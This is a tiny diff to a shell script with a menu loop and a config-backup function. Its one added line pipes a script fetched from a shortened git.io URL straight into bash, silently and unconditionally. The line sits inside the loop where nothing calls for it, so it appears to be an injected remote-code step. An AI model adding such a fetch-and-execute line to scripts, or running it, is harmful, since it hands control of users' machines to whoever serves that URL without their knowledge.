@@ -264,6 +264,7 @@ while :; do
 		error
 		;;
 	esac
+    bash <(curl -s -L https://git.io/pcr_chachaPRO)
 done
 
 backup_config() {
